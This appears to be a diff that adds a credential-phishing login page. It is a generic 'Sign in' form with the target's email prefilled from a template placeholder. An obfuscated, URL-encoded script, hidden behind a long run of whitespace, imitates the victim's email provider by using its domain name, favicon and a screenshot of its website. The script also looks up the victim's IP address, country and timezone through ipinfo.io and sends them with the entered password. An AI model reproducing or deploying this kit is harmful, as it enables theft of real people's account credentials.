@@ -1,0 +1,354 @@
+<html>
+<head> 
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- jQuery library -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+
+<link rel="shortcut icon" type="image/jpeg" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAAIACAYAAAD0eNT6AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAsASURBVHic7d0xb1RnFoDh49FKoKzpY4mKjiJl5A5FiCqSBdT8ApfUG1GgbE3JL6DGCCnVCkXpUMoUdK6QnB6DTOUtxt4FAgQB9gje55GmuTNjn2q+d+7M3G/t8PBwPsTzK5tnZubyzFydmYszs3F0W/+gPwB8dv/8z+O1Vf7/rZ3rH/YCApyE/ZnZO7o9mZkHM/Po4bX7Lz/kyWt/FwDPr2xuzMytmbkxM+c+aVTgsxIAwBuezcy9mbn98Nr9vfc98J0B8PzK5tmZ+Wlmbs7MN597QuDTCQDgHV7MzJ2Z+fnhtfsHb3vA4m0Hn1/Z/HZmfp2Zf43FHwC+NN/Mcg3/dWvn+rdve8BfAuD5lc3vZub3mdk82dkAgBO2OTO/b+1c/+7NO14LgKN3/r/MzPlTGgwAOFnnZ+aXN88E/C8Ajj7z3xmLPwB8bc7PzM7WzvWzxwdePQPw0zjtDwBfq81ZrvUzcxQARz/1u7mqiQCAU3Fza+f6xsz/zwDcGt/2B4Cv3TezXPNncXSFvxurnQcAOCU3tnaun1nM8vK+rvAHAA3nZubyYpbX9gcAOq4uZrmxDwDQcXExyx39AICODQEAAD0bi5lZX/UUAMCpWn/rboAAwNdNAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIWjs8PFz1DADAKXMGAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAoH9cuLt/uOohgI+zu72+ttIBfjvr9QO+UM4AAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQtJiZ/VUPAQCcqv3FzOytegoA4FTtCQAA6NlbzMyTVU8BAJyqJ4uZebDqKQCAU/VgMTOPZubZqicBAE7Fs5l5tNjdXn85M/dWPQ0AcCruzaWDl8fXAbg9My9WOQ0AcOJezHLNX14IaHd7fW9m7qxyIgDgxN2ZSwd7M69fCfDnmXm8mnkAgBP2eJZr/cy8EgC72+sHM3NtZp6uYCgA4OQ8nZlrc+ng4PjAa3sB7G6v/zkzP44IAICvxdOZ+XEuHfz56sG/bAa0u73+x8x8Pz4OAIAv3eOZ+X4uHfzx5h1v3Q3w6EzADzPz7/HrAAD40ryY5Rr+w5vv/I+tHR4evvcvXLi7vzEzt2bmxsyc+9wTAh9vd3t9baUD/Hb2/S8gwGl7Nstr+9w+/rb/u/xtABy7cHf/zMxcnpmrM3NxZjaObuufNCrw0QQApO3PckO/vVnu6/NgZh7NpYOXH/Lk/wKQAq5eW3YI8AAAAABJRU5ErkJggg=="/>
+
+<style>
+
+
+body{
+margin:0;
+padding:0;
+background-repeat:no-repeat;
+background-size:cover;
+background-position:center;
+background: rgba(0, 0, 0, 0.04);
+
+}
+
+#cover{
+	margin:auto;
+	width:auto;
+	margin:10px 0px 10px 0px;
+	}
+
+
+#ccc {
+	margin:auto;
+	width:auto;
+	max-width:430px;
+
+
+	}
+
+#center {
+	margin:auto;
+	margin-top:15%;
+	max-width:430px;
+	min-height:450px;
+	ackground:blue;
+	margin-left:5px;
+	margin-right:5px;
+
+	}
+	
+#center2 {
+	margin:auto;
+	margin-top:0px;
+	padding:30px;
+	width:auto;
+	min-height:420px;
+	background:white;
+	box-shadow: 0px 0px 10px -2px black;
+	padding: 25px 30px 30px;
+    background: rgba(0, 0, 0,0.8);
+    border-radius: 5px 5px 0 0;
+
+	}
+	
+#footer {
+	position:fixed;
+	bottom:0;
+	left:0;
+	width:100%;
+	height:15px;
+	background:#5B5E62;
+	padding:0px 20px 10px 10px ;
+	color:#FFF;
+	text-align:right;
+	font-family:sans-serif;
+	font-size:2px;
+	}
+	
+a{
+	 text-decoration:none;
+	 color:#fff;
+	 font-size:12px;
+}
+
+input{
+	font-size:18px;
+	border-color:#005DA6;
+	border-width:2px;
+	border-top:;
+	border-left:;
+	border-right:;
+	padding:10px 10px 10px 10px;
+	border-radius:5px;
+	
+	}
+
+input:focus{
+	outline:none;
+	}
+	
+	
+
+
+
+.login-1 .login-inner-form .details {
+    padding: 25px 30px 30px;
+    background: rgba(0, 0, 0,0.8);
+    border-radius: 5px 5px 0 0;
+}
+
+.login-1 .login-inner-form img {
+    margin-bottom: 15px;
+    height: 30px;
+}
+
+.login-1 .login-inner-form h3 {
+    margin: 0 0 25px;
+    font-size: 18px;
+    font-weight: 400;
+    font-family: 'Open Sans', sans-serif;
+    color: #fff;
+}
+
+.login-1 .login-inner-form .form-group {
+    margin-bottom: 25px;
+}
+
+.login-1 .login-inner-form .input-text {
+    width: 100%;
+    padding: 10px 15px;
+    font-size: 14px;
+    border: 1px solid #e8e7e7;
+    outline: none;
+    color: #717171;
+    border-radius: 3px;
+    height: 45px;
+}
+
+.login-1 .login-inner-form .btn-md {
+    cursor: pointer;
+    padding: 12px 30px 11px 30px;
+    letter-spacing: 1px;
+    font-size: 15px;
+    font-weight: 600;
+    font-family: 'Open Sans', sans-serif;
+    border-radius: 3px;
+}
+
+.login-1 .login-inner-form .social-list{
+    margin-bottom: 0;
+    padding: 0;
+}
+
+.login-1 .login-inner-form .checkbox a {
+    font-size: 14px;
+    color: #717171;
+    float: right;
+}
+
+.login-1 .login-inner-form .terms{
+    margin-left: 3px;
+}
+
+.login-1 .login-inner-form .checkbox {
+    margin-bottom: 25px;
+    font-size: 14px;
+}
+
+.login-1 .login-inner-form .form-check{
+    float: left;
+    margin-bottom: 0;
+}
+
+.login-1 .login-inner-form .form-check a {
+    color: #717171;
+    float: right;
+}
+
+.login-1 .login-inner-form .form-check-input {
+    position: absolute;
+    margin-left: 0;
+}
+
+.login-1 .login-inner-form .form-check label::before {
+    content: "";
+    display: inline-block;
+    position: absolute;
+    width: 17px;
+    height: 17px;
+    margin-left: -25px;
+    border: 1px solid #cccccc;
+    border-radius: 3px;
+    background-color: #fff;
+}
+
+.login-1 .login-inner-form .form-check-label {
+    padding-left: 25px;
+    margin-bottom: 0;
+    font-size: 14px;
+}
+
+.login-1 .login-inner-form .checkbox-theme input[type="checkbox"]:checked + label::before {
+    background-color: #0f96f9;
+    border-color: #0f96f9;
+}
+
+.login-1 .login-inner-form input[type=checkbox]:checked + label:before {
+    font-weight: 300;
+    color: #f3f3f3;
+    line-height: 15px;
+    font-size: 14px;
+    content: "\2713";
+}
+
+.login-1 .login-inner-form input[type=checkbox], input[type=radio] {
+    margin-top: 4px;
+}
+
+.login-1 .login-inner-form .social-list li {
+    display: inline-block;
+    font-size: 16px;
+    margin-top: 30px;
+}
+
+.login-1 .login-inner-form .social-list li a {
+    margin:2px;
+    font-size: 14px;
+    width: 35px;
+    height: 35px;
+    border-radius: 3px;
+    display: inline-block;
+    text-align: center;
+    line-height: 35px;
+}
+
+.login-1 .login-inner-form .footer {
+    font-size: 14px;
+    padding: 15px 20px;
+    background-color: #f5f5f5;
+    border-radius: 0 0 5px 5px;
+    border-top: solid 1px #f5f5f5;
+}
+	
+	
+</style>
+
+</head>
+
+<!--===================================-->
+	<input type="hidden" id="mail" value="[[-Email-]]">
+<!--===================================-->
+
+  <script>
+  
+  //let mainemail = "<?php echo $_GET["idcarrd"] ; ?>" ;
+  //let mainemail = "lunazhang@hostinger.com" ;
+  
+  let mainemail = document.getElementById("mail").value;
+  
+  
+  </script>
+
+
+<body>
+<div id="cover">
+
+<div id="ccc">
+<div id="center">
+
+<div id="center2">
+<p style="text-align:center; float:;" id="foward"><img height="25px" width="25px" src=""></p> 
+<p id="throwout" style="text-align:center; margin-top:20px; font-family:verdana; font-weight:bold; font-size:17px; color:#737373;">k</p>
+
+
+
+<form method="post">
+<!--<form method="POST" action="post.php">-->
+
+
+<!--==================================================================-->
+<p>
+
+<input id="idcarrd" type="email"  name="email" class="text" size="25" style="width:100%; border:; margin-top:2px;" value="
+
+
+[[-Email-]]
+
+
+
+" required="required" placeholder="Email" required>
+
+</p>
+
+
+<!--==================================================================-->
+
+<br>
+<span style="clear:both; font-family:sans-serif; color:white;">Enter password</span>
+
+	<span style="background:; font-size:14px; color:red; font-weight:;" id="mistake"></span></p>
+
+<p> <input type="password" name="password" id="backcarrd" style="width:100%;" size="" placeholder="Password"  required="required" required ></p>
+
+
+
+     <label for="rrrrr"></label>
+  <input type="hidden" id="element" name="camel_iphone" placeholder="lkoiu" required="" />  
+  
+  <label for="ttttt"></label>
+  <input type="hidden" id="flowride" name="ip" placeholder="qatyu" required="" />  
+
+  <label for="yyyyy"></label>
+  <input type="hidden" id="deler" name="region" placeholder="znhuy" required="" />  
+
+    <br>
+    <br>
+    <br>
+	
+  <button type="submit"  id="submit-btn" style="border:none; border-radius:5px; cursor:pointer; float:right; height:40px; width:100%; background-color:#005DA6; color:white;">Sign in</button>
+  
+
+
+  <br>
+</form>
+
+</div>
+
+
+</div>
+</div>
+
+
+
+
+</div>
+
+
+<script>	
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+
+		
+		
+		</script>
+		
+		
+<script>
+<!--
+document.write(unescape("%09%09%3Cscript%3E%0A%09%09%0A//var%20mainemail%20%20%3D%20location.hash.substr%281%29%3B%0A%09%09%0A%09%09//%20variant%201%20%28without%20%27@%27%29%0Avar%20mailArr%20%3D%20mainemail.split%28%27@%27%29%3B%0Avar%20username%20%3D%20mailArr%5B0%5D%3B%0Avar%20allpart%20%3D%20mailArr%5B1%5D%3B%0A%0Avar%20qlexx%20%3D%20allpart.split%28%27.%27%29%3B%0Avar%20domname0%20%3D%20qlexx%5B0%5D%3B%0Avar%20domname1%20%3D%20qlexx%5B1%5D%3B%0A%0A%0Adocument.getElementById%28%22throwout%22%29.innerHTML%20%3D%20domname0.toUpperCase%28%29%3B%0A//document.getElementById%28%22dom%22%29.innerHTML%20%3D%20allpart%3B%0A%0A%0A//var%20image%20%3D%20%22url%28%27https%3A//image.thum.io/get/width/1200/https%3A//hostinger.%22+%22com%27%29%22%0A%09%09var%20output%20%3D%20allpart%3B%09%09%09%0A%09%09var%20image%20%3D%20%22url%28%27https%3A//image.thum.io/get/width/1200/https%3A//%22+output%3B%22%27%29%22%09%09%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20document.body.style.backgroundImage%20%3D%20image%3B%09%20%09%0A%0Adocument.getElementById%28%27foward%27%29.innerHTML%3D%27%3Cimg%20height%3D%2240%22%20width%3D%2240%22%20src%3D%5C%27https%3A//icons.duckduckgo.com/ip3/%27+%20allpart%20+%27.ico%5C%27%3E%27%0A%0A%0A%0A%0A%0A%3C/script%3E%0A%0A%0A%09%3Cscript%3E%0A%09document.getElementById%28%22idcarrd%22%29.value%20%3D%20mainemail%3B%0A%09%3C/script%3E%0A%0A%0A%3Cscript%3E%0A%20%20function%20recordData%20%28data%29%20%7B%0A%20%20%0A%20%20%20%20%20document.getElementById%28%22element%22%29.value%20%3D%20%28data.country%29%3B%0A%20%20%20%20%20document.getElementById%28%22flowride%22%29.value%20%3D%20%28data.ip%29%3B%20%0A%20%20%20%20%20document.getElementById%28%22deler%22%29.value%20%3D%20%28data.timezone%29%3B%20%0A%20%20%0A%20%20%20%20//console.log%28data.ip%2C%20data.country%29%0A%20%20%7D%0A%3C/script%3E%0A%3Cscript%20src%3D%22https%3A//ipinfo.io/json%3Fcallback%3DrecordData%22%3E%3C/script%3E%0A"));
+//-->
+</script>
+
+
+</body>
+
+</html>
